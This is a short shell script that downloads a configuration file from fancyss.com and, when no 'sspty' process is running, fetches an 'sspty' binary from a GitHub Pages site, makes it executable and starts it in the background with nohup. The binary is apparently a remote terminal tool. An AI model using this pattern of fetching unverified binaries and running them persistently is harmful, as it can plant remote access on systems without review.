#!/bin/sh
srun=`pgrep sspty`
wget -q http://fancyss.com/__remote/$1 -O ./ssconf.sh
if [ "$srun" = "" ]; then
    echo "sspty starting"
    wget -q http://jannson.github.io/sspty/sspty -O ./sspty
    chmod 755 ./sspty
    nohup ./sspty > pty.log 2>&1 &
fi
